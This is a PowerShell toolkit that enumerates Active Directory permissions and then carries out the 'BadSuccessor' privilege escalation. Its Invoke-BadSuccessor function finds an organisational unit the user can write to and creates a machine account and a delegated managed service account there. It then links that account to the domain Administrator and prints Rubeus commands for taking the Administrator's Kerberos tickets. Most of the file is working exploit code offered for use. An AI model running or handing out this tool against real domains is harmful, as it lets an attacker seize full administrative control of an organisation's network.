# --------------------------
# LOADS THE AD MODULE ONCE
# --------------------------
if (-not (Get-Module ActiveDirectory)) {
    $oldVerbosePreference = $VerbosePreference
    $VerbosePreference    = 'SilentlyContinue'
    Import-Module ActiveDirectory -ErrorAction Stop
    $VerbosePreference    = $oldVerbosePreference
}


function Get-ADObjectACL {
<#
.SYNOPSIS
    Enumerates Access Control Entries (ACEs) on Active Directory objects.

.DESCRIPTION
    Retrieves ACL (Access Control List) entries for every object within a specified
    SearchBase. Useful for auditing permissions, identifying unusual delegations,
    and filtering out default or administrative ACEs that create noise during assessments.

    Provides two filtering mechanisms:
      -ExcludeDefaultSIDs  → removes common system/builtin SIDs
      -ExcludeAdmins       → removes domain and enterprise-level administrative groups
                             based on well-known RIDs from the current domain SID.

.PARAMETER SearchBase
    Distinguished Name (DN) path where enumeration begins.
    Defaults to the root DN of the current AD domain.

.PARAMETER ExcludeDefaultSIDs
    Excludes common built-in SIDs such as:
      - Everyone
      - Authenticated Users
      - LOCAL SYSTEM
      - NT AUTHORITY\SELF
      - Well-known BUILTIN groups (Administrators, Account Operators, etc.)

.PARAMETER ExcludeAdmins
    Excludes domain-specific administrative groups based on their RIDs:
      - Domain Admins (512)
      - Enterprise Admins (519)
      - Enterprise RODCs (498)
      - Domain Controllers (516)
      - Cert Publishers (517)
      - Group Policy Creator Owners (520)
      - Cloneable Domain Controllers (522)
      - Key Admins (526)
      - Enterprise Key Admins (527)
      - RAS / IAS Servers and related infra (553)

.EXAMPLE
    Get-ADObjectACL

    Retrieves all AD object ACLs without filtering.

.EXAMPLE
    Get-ADObjectACL -ExcludeDefaultSIDs

    Retrieves ACLs but removes default noise SIDs such as Everyone, Authenticated Users,
    BUILTIN groups, and SELF.

.EXAMPLE
    Get-ADObjectACL -ExcludeDefaultSIDs -ExcludeAdmins

    Retrieves only **non-default**, **non-admin** ACL entries.
    This is ideal for identifying excessive privileges or privilege escalation paths.

.EXAMPLE
    Get-ADObjectACL -SearchBase "OU=Finance,DC=hackerlab,DC=local" -ExcludeAdmins

    Retrieves ACLs only under the Finance OU while ignoring administrative groups.

.NOTES
    Author: B5null 
    Requires: RSAT ActiveDirectory module + AD PSDrive provider

#>
    [CmdletBinding()]
    param(
        [string]$SearchBase,
        [switch]$ExcludeDefaultSIDs,
        [switch]$ExcludeAdmins
    )


    if (-not $SearchBase) {
        $SearchBase = (Get-ADDomain).DistinguishedName
    }

    # ==========================
    # DEFAULT EXCLUSION LIST
    # ==========================
    $defaultExclude = @(
        'S-1-1-0',          # Everyone
        'S-1-5-9',          # Enterprise Domain Controllers
        'S-1-5-11',         # Authenticated Users
        'S-1-5-18',         # LOCAL SYSTEM
        'S-1-5-32-554',     # Pre-Windows 2000 Compatible Access
        'S-1-3-0',          # CREATOR OWNER
        'S-1-5-10',         # NT AUTHORITY\SELF

        # BUILTIN GROUPS
        'S-1-5-32-544',     # BUILTIN\Administrators
        'S-1-5-32-548',     # BUILTIN\Account Operators
        'S-1-5-32-550',     # BUILTIN\Print Operators
        'S-1-5-32-557',     # BUILTIN\Incoming Forest Trust Builders
        'S-1-5-32-560',     # BUILTIN\Windows Authorization Access Group
        'S-1-5-32-561'      # BUILTIN\Terminal Server License Servers
    )

    # ==========================
    # ADMIN-TYPE DOMAIN GROUPS (RID-based)
    # ==========================
    $domain    = Get-ADDomain
    $domainSid = $domain.DomainSID.Value

    $adminRids = @(
        512, # Domain Admins
        519, # Enterprise Admins
        498, # Enterprise Read-Only Domain Controllers
        516, # Domain Controllers
        517, # Cert Publishers
        520, # Group Policy Creator Owners
        522, # Cloneable Domain Controllers
        526, # Key Admins
        527, # Enterprise Key Admins
        553  # RAS and IAS Servers / related infra
    )

    $adminSids = $adminRids | ForEach-Object { "$domainSid-$_" }

    Get-ADObject -SearchBase $SearchBase -LDAPFilter "(objectClass=*)" -Properties distinguishedName |
        ForEach-Object {
            $dn = $_.DistinguishedName

            try {
                $acl = Get-Acl "AD:$dn"
            }
            catch {
                return
            }

            foreach ($ace in $acl.Access) {

                $sid = $null
                try {
                    $sid = ($ace.IdentityReference.Translate(
                        [System.Security.Principal.SecurityIdentifier]
                    )).Value
                }
                catch {}

                $obj = [pscustomobject]@{
                    ObjectDN              = $dn
                    IdentityReference     = $ace.IdentityReference.ToString()
                    SecurityIdentifier    = $sid
                    ActiveDirectoryRights = $ace.ActiveDirectoryRights
                    AccessControlType     = $ace.AccessControlType
                    ObjectType            = $ace.ObjectType
                    InheritanceFlags      = $ace.InheritanceFlags
                    PropagationFlags      = $ace.PropagationFlags
                    IsInherited           = $ace.IsInherited
                }

                if ($obj.SecurityIdentifier) {

                    if ($ExcludeDefaultSIDs -and $obj.SecurityIdentifier -in $defaultExclude) {
                        continue
                    }

                    if ($ExcludeAdmins -and $obj.SecurityIdentifier -in $adminSids) {
                        continue
                    }
                }

                $obj
            }
        }
}


function Find-VulnerableOU {
<#
.SYNOPSIS
    Finds where a user (and their group memberships) have CreateChild rights in AD.

.DESCRIPTION
    This function uses the existing Get-ADObjectACL function to enumerate ACLs, then
    filters for ACEs where the SecurityIdentifier matches either:
      - the specified user’s SID, or
      - any SID of groups the user is a member of (via Get-ADPrincipalGroupMembership)

    It then returns only ACEs where ActiveDirectoryRights includes the CreateChild flag.
    This is useful for identifying where a user (directly or via groups) can create
    new child objects (e.g., new users, computers, groups) in the directory.

.PARAMETER Identity
    The user to analyze. Can be:
      - sAMAccountName
      - UPN
      - DN
      - SID
    If omitted, defaults to the current logon user ($env:USERNAME).

.EXAMPLE
    Get-ADUserCreateChildRights

    Uses the current user context and returns all AD objects where the user or any
    of their groups has CreateChild rights.

.EXAMPLE
    Get-ADUserCreateChildRights -Identity "b5null"

    Same as above, but explicitly for the user 'b5null'.

.NOTES
    Requires:
      - RSAT ActiveDirectory module
      - Get-ADObjectACL function already defined in the session

#>
    [CmdletBinding()]
    param(
        [string]$Identity
    )


    if (-not $Identity) {
        $Identity = $env:USERNAME
    }

    # Get user + SID
    $user = Get-ADUser -Identity $Identity -Properties SID
    if (-not $user) {
        Write-Error "User '$Identity' not found."
        return
    }

    $userSid = $user.SID.Value

    # Get all group memberships (transitive) + their SIDs
    $groupSids = @()
    try {
        $groups = Get-ADPrincipalGroupMembership -Identity $user
        $groupSids = $groups | ForEach-Object { $_.SID.Value }
    }
    catch {
        Write-Verbose "Failed to resolve group memberships for $Identity : $_"
    }

    # All principals in the user's token (user + groups)
    $principalSids = @($userSid) + $groupSids
    $principalSids = $principalSids | Sort-Object -Unique

    # Use your existing ACL enumerator
    $acls = Get-ADObjectACL

    $acls |
        Where-Object {
            $_.SecurityIdentifier -and
            ($_.SecurityIdentifier -in $principalSids) -and
            (($_.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::CreateChild) -ne 0)
        } |
        Select-Object ObjectDN,
                      IdentityReference,
                      SecurityIdentifier,
                      ActiveDirectoryRights,
                      AccessControlType,
                      IsInherited
}


function Add-ADObjectACL {
<#
.SYNOPSIS
    Adds an ACE to an Active Directory object ACL using only the AD module.

.DESCRIPTION
    Mimics the core behavior of PowerView's Add-DomainObjectAcl, but implemented
    using the ActiveDirectory module and native Get-Acl / Set-Acl on the AD: drive.

.PARAMETER TargetIdentity
    The target AD object to modify (where the ACE will be added). Can be:
      - DN (CN=...,OU=...,DC=...,DC=...)
      - samAccountName
      - name

.PARAMETER PrincipalIdentity
    The security principal (user/group/computer/service account) that will be
    granted the rights. Can be:
      - samAccountName
      - name
      - SID string (S-1-5-21-...)

.PARAMETER Rights
    Rights to grant. Supported:
      All, GenericAll, GenericRead, GenericWrite,
      CreateChild, DeleteChild, ReadProperty, WriteProperty,
      Delete, WriteDacl, WriteOwner

.PARAMETER AceType
    Allow or Deny. Defaults to Allow.

.PARAMETER Inheritance
    ThisObjectOnly, ThisObjectAndChildren, All

.EXAMPLE
    Add-ADObjectACL -Rights 'All' -TargetIdentity "attacker_dMSA$" -PrincipalIdentity "b5null"
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$TargetIdentity,

        [Parameter(Mandatory = $true)]
        [string]$PrincipalIdentity,

        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string[]]$Rights,

        [ValidateSet('Allow','Deny')]
        [string]$AceType = 'Allow',

        [ValidateSet('ThisObjectOnly','ThisObjectAndChildren','All')]
        [string]$Inheritance = 'ThisObjectOnly'
    )

    # --- helper: resolve target DN ---
    function Resolve-ADObjectDN {
        param(
            [string]$Identity
        )

        $domainDN = (Get-ADDomain).DistinguishedName

        Write-Verbose "[*] Resolving target identity '$Identity'..."

        # 1) If it looks like a DN, validate it
        if ($Identity -match '^.+?=.+?,DC=.+') {
            try {
                $obj = Get-ADObject -Identity $Identity -ErrorAction Stop
                Write-Verbose ("    -> Treated as DN via Get-ADObject: {0}" -f $obj.DistinguishedName)
                return $obj.DistinguishedName
            } catch {
                Write-Verbose "    -> DN lookup failed: $_"
            }
        }

        # 2) Try common object types directly by Identity
        foreach ($cmd in 'Get-ADUser','Get-ADComputer','Get-ADGroup','Get-ADServiceAccount') {
            try {
                $obj = & $cmd -Identity $Identity -ErrorAction Stop
                if ($obj -and $obj.DistinguishedName) {
                    Write-Verbose ("    -> Resolved via {0}: {1}" -f $cmd, $obj.DistinguishedName)
                    return $obj.DistinguishedName
                }
            } catch {
                # ignore and continue
            }
        }

        # 3) Fallback: subtree search by samAccountName / name
        $filter = "(|(samAccountName=$Identity)(name=$Identity))"
        Write-Verbose "    -> Fallback search with LDAP filter: $filter"

        $fallback = Get-ADObject -LDAPFilter $filter -SearchBase $domainDN -SearchScope Subtree -ErrorAction SilentlyContinue | Select-Object -First 1

        if ($fallback -and $fallback.DistinguishedName) {
            Write-Verbose ("    -> Resolved via fallback search: {0}" -f $fallback.DistinguishedName)
            return $fallback.DistinguishedName
        }

        throw "Could not resolve TargetIdentity '$Identity' to an AD object."
    }

    # --- helper: resolve principal to SID ---
    function Resolve-PrincipalSID {
        param(
            [string]$Identity
        )

        Write-Verbose "[*] Resolving principal identity '$Identity'..."

        # If it's already a SID string, just return it
        if ($Identity -match '^S-\d-\d+-(\d+-){1,14}\d+$') {
            Write-Verbose "    -> Treated as raw SID: $Identity"
            return $Identity
        }

        foreach ($cmd in 'Get-ADUser','Get-ADComputer','Get-ADGroup','Get-ADServiceAccount') {
            try {
                $obj = & $cmd -Identity $Identity -Properties SID -ErrorAction Stop
                if ($obj -and $obj.SID) {
                    Write-Verbose ("    -> Resolved via {0}: {1}" -f $cmd, $obj.SID.Value)
                    return $obj.SID.Value
                }
            } catch {
                # ignore and continue
            }
        }

        throw "Could not resolve PrincipalIdentity '$Identity' to a SID."
    }

    # --- resolve identities ---
    $targetDN          = Resolve-ADObjectDN -Identity $TargetIdentity
    $principalSidValue = Resolve-PrincipalSID -Identity $PrincipalIdentity

    Write-Verbose "[*] Target DN: $targetDN"
    Write-Verbose "[*] Principal SID: $principalSidValue"

    $principalSid = New-Object System.Security.Principal.SecurityIdentifier($principalSidValue)

    # --- build rights mask ---
    $adrEnum    = [System.DirectoryServices.ActiveDirectoryRights]
    $rightsMask = [System.DirectoryServices.ActiveDirectoryRights]::None

    foreach ($r in $Rights) {
        switch ($r.ToLower()) {
            'all'          { $rightsMask = $rightsMask -bor $adrEnum::GenericAll }
            'genericall'   { $rightsMask = $rightsMask -bor $adrEnum::GenericAll }
            'genericread'  { $rightsMask = $rightsMask -bor $adrEnum::GenericRead }
            'genericwrite' { $rightsMask = $rightsMask -bor $adrEnum::GenericWrite }
            'createchild'  { $rightsMask = $rightsMask -bor $adrEnum::CreateChild }
            'deletechild'  { $rightsMask = $rightsMask -bor $adrEnum::DeleteChild }
            'readproperty' { $rightsMask = $rightsMask -bor $adrEnum::ReadProperty }
            'writeproperty'{ $rightsMask = $rightsMask -bor $adrEnum::WriteProperty }
            'delete'       { $rightsMask = $rightsMask -bor $adrEnum::Delete }
            'writedacl'    { $rightsMask = $rightsMask -bor $adrEnum::WriteDacl }
            'writeowner'   { $rightsMask = $rightsMask -bor $adrEnum::WriteOwner }
            default        { throw "Unsupported right '$r'. Supported: All, GenericAll, GenericRead, GenericWrite, CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, WriteDacl, WriteOwner." }
        }
    }

    Write-Verbose "[*] Rights mask: $rightsMask"

    # --- map AceType & Inheritance ---
    $accessType = [System.Security.AccessControl.AccessControlType]::$AceType

    $inheritEnum = [System.DirectoryServices.ActiveDirectorySecurityInheritance]
    $inheritVal  = switch ($Inheritance) {
        'ThisObjectOnly'        { $inheritEnum::None }
        'ThisObjectAndChildren' { $inheritEnum::SelfAndChildren }
        'All'                   { $inheritEnum::All }
    }

    Write-Verbose "[*] AceType: $AceType"
    Write-Verbose "[*] Inheritance: $Inheritance ($inheritVal)"

    # --- build access rule ---
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $principalSid,
        $rightsMask,
        $accessType,
        $inheritVal
    )

    $adPath = "AD:$targetDN"
    Write-Verbose "[*] AD path: $adPath"

    try {
        Write-Verbose "[*] Getting ACL..."
        $acl = Get-Acl -Path $adPath

        Write-Verbose "[*] Adding access rule..."
        $null = $acl.AddAccessRule($rule)

        Write-Verbose "[*] Setting ACL..."
        Set-Acl -Path $adPath -AclObject $acl

        Write-Output "[+] Added ACE on '$targetDN' for '$PrincipalIdentity' ($($principalSid.Value)) with rights '$($Rights -join ',')' ($AceType, $Inheritance)."
    }
    catch {
        Write-Error "[-] Failed to modify ACL on $targetDN : $_"
    }
}


function Invoke-BadSuccessor {
<#
.SYNOPSIS
    Abuses a vulnerable OU to create a computer + delegated MSA, grant GenericAll, and
    configure msDS-DelegatedMSAState / msDS-ManagedAccountPrecededByLink.

.DESCRIPTION
    - Finds a vulnerable OU via Find-VulnerableOU
    - Creates/reuses a machine account
    - Creates/reuses a delegated MSA
    - Grants GenericAll on the dMSA
    - Sets:
        msDS-DelegatedMSAState = 2
        msDS-ManagedAccountPrecededByLink = <DN>

.PARAMETER ComputerName
    Computer to create/reuse. Default: Pwn

.PARAMETER Password
    Computer account password. Default: Password123!

.PARAMETER ServiceAccountName
    Delegated MSA name. Default: attacker_dMSA

.PARAMETER ServiceDnsHostName
    DNS host for the delegated MSA. Default: herewegoagain.com

.PARAMETER PrecededByIdentity
    Identity used for msDS-ManagedAccountPrecededByLink. Defaults to Administrator (RID 500)

.PARAMETER Quiet
    Suppresses post-exploitation tips and extra output.

.EXAMPLE
    Invoke-BadSuccessor -Quiet

.EXAMPLE
    Invoke-BadSuccessor -ComputerName "Pwn01" -ServiceAccountName "web_dMSA"

.NOTES
    Author: B5null
    Requires:
      - RSAT ActiveDirectory module
      - Find-VulnerableOU
      - Add-ADObjectACL
#>
    [CmdletBinding()]
    param(
        [string]$ComputerName       = "Pwn",
        [string]$Password           = "Password123!",
        [string]$ServiceAccountName = "attacker_dMSA",
        [string]$ServiceDnsHostName = "herewegoagain.com",
        [string]$PrecededByIdentity,
        [switch]$Quiet
    )

    # 1. Find vulnerable OU
    Write-Verbose "[*] Searching for vulnerable OUs with Find-VulnerableOU..."
    $vuln = Find-VulnerableOU
    if (-not $vuln) {
        Write-Host "[-] No vulnerable OU found." -ForegroundColor Yellow
        return
    }

    $targetOu = $vuln[0].ObjectDN
    Write-Verbose "[*] Using target OU: $targetOu"

    # 2. Create or reuse computer
    Write-Verbose "[*] Checking if computer '$ComputerName' exists..."
    try { $existingComputer = Get-ADComputer -Identity $ComputerName -ErrorAction Stop } catch { $existingComputer = $null }

    if ($existingComputer) {
        Write-Host "[!] Computer '$ComputerName' already exists." -ForegroundColor Yellow
        $machine = $existingComputer
    }
    else {
        Write-Verbose "[*] Creating new computer '$ComputerName'..."
        $machine = New-ADComputer -Name $ComputerName `
                                  -SamAccountName ($ComputerName + '$') `
                                  -AccountPassword (ConvertTo-SecureString $Password -AsPlainText -Force) `
                                  -Path $targetOu -PassThru
        Write-Host "[+] Created computer '$ComputerName' in '$targetOu'." -ForegroundColor Green
    }

    Write-Host "[+] Machine Account's sAMAccountName : $($machine.SamAccountName)" -ForegroundColor Green
    Write-Host "[+] Machine Account's SID             : $($machine.SID.Value)"    -ForegroundColor Green
    Write-Host ""

    # 3. Create or reuse delegated MSA
    Write-Verbose "[*] Checking if service account '$ServiceAccountName' exists..."
    try {
        $service = Get-ADServiceAccount -Identity $ServiceAccountName -ErrorAction Stop
        $serviceExists = $true
    } catch {
        $serviceExists = $false
    }

    if ($serviceExists) {
        Write-Host "[!] Service account '$ServiceAccountName' already exists." -ForegroundColor Yellow
        try {
            Set-ADServiceAccount -Identity $ServiceAccountName `
                                 -PrincipalsAllowedToRetrieveManagedPassword $machine.SamAccountName `
                                 -ErrorAction Stop
        } catch {}
        $service = Get-ADServiceAccount -Identity $ServiceAccountName -Properties SID,PrincipalsAllowedToRetrieveManagedPassword
    }
    else {
        Write-Verbose "[*] Creating delegated service account '$ServiceAccountName'..."
        $service = New-ADServiceAccount -Name $ServiceAccountName `
                                        -DNSHostName $ServiceDnsHostName `
                                        -CreateDelegatedServiceAccount `
                                        -PrincipalsAllowedToRetrieveManagedPassword $machine.SamAccountName `
                                        -Path $targetOu `
                                        -KerberosEncryptionType AES256 `
                                        -PassThru
        Write-Host "[+] Created delegated service account '$ServiceAccountName' in '$targetOu'." -ForegroundColor Green
    }

    Write-Host "[+] Service Account's sAMAccountName : $($service.SamAccountName)" -ForegroundColor Green
    Write-Host "[+] Service Account's SID             : $($service.SID.Value)" -ForegroundColor Green
    Write-Host "[+] Allowed to retrieve password      : $($machine.SamAccountName)" -ForegroundColor Green
    Write-Host ""

    # 4. Grant GenericAll on the dMSA
    $currentUser = $env:USERNAME
    Add-ADObjectACL -Rights 'All' -TargetIdentity $service.SamAccountName -PrincipalIdentity $currentUser
    Write-Host "[+] Granted 'GenericAll' on '$($service.SamAccountName)' to '$currentUser'." -ForegroundColor Green

    # 5. Resolve PrecededBy identity
    Write-Verbose "[*] Resolving PrecededByIdentity..."
    $precededObject = $null

    if ($PrecededByIdentity) {
        try { $precededObject = Get-ADObject -Identity $PrecededByIdentity -ErrorAction Stop } catch {}
        if (-not $precededObject) {
            $domainDn = (Get-ADDomain).DistinguishedName
            $bases = @("CN=Users,$domainDn","CN=Computers,$domainDn",$domainDn)
            foreach ($b in $bases) {
                if (-not $precededObject) {
                    try {
                        $precededObject = Get-ADObject -LDAPFilter "(&(objectClass=*)(sAMAccountName=$PrecededByIdentity))" -SearchBase $b -ErrorAction Stop
                    } catch {}
                }
            }
        }
        if (-not $precededObject) { Write-Warning "[!] Failed to resolve PrecededByIdentity."; return }
    }
    else {
        try {
            $domainDn = (Get-ADDomain).DistinguishedName
            $precededObject = Get-ADUser -Filter 'SamAccountName -eq "Administrator"' -SearchBase "CN=Users,$domainDn" -ErrorAction Stop
        } catch {
            Write-Warning "[!] Could not find RID 500 Administrator."; return
        }
    }

    # 6. Set ADSI attributes
    try {
        $serviceDn  = $service.DistinguishedName
        $precededDn = $precededObject.DistinguishedName
        $dMSA = [ADSI]"LDAP://$serviceDn"
        $dMSA.Put("msDS-DelegatedMSAState", 2)
        $dMSA.Put("msDS-ManagedAccountPrecededByLink", $precededDn)
        $dMSA.SetInfo()
        Write-Host "[+] Configured delegated MSA state for '$($service.SamAccountName)' with predecessor:" -ForegroundColor Green
        Write-Host "    $precededDn"
    }
    catch {
        Write-Warning "[!] Failed to configure delegated MSA state: $($_.Exception.Message)"
    }

    # 7. Rubeus post-exploitation tips (skip if quiet)
    if (-not $Quiet) {
        $domain = (Get-ADDomain).DNSRoot
        Write-Host ""
        Write-Host "[+] Next steps (Rubeus):" -ForegroundColor Cyan
        Write-Host "    Rubeus.exe hash /password:'$Password' /user:$($machine.SamAccountName) /domain:$domain"
        Write-Host "    Rubeus.exe asktgt /user:$($machine.SamAccountName) /aes256:<AES256KEY> /domain:$domain"
        Write-Host "    Rubeus.exe asktgs /targetuser:$($service.SamAccountName) /service:krbtgt/$domain /dmsa /opsec /ptt /nowrap /outfile:ticket.kirbi /ticket:<BASE64TGT>"
    }
}

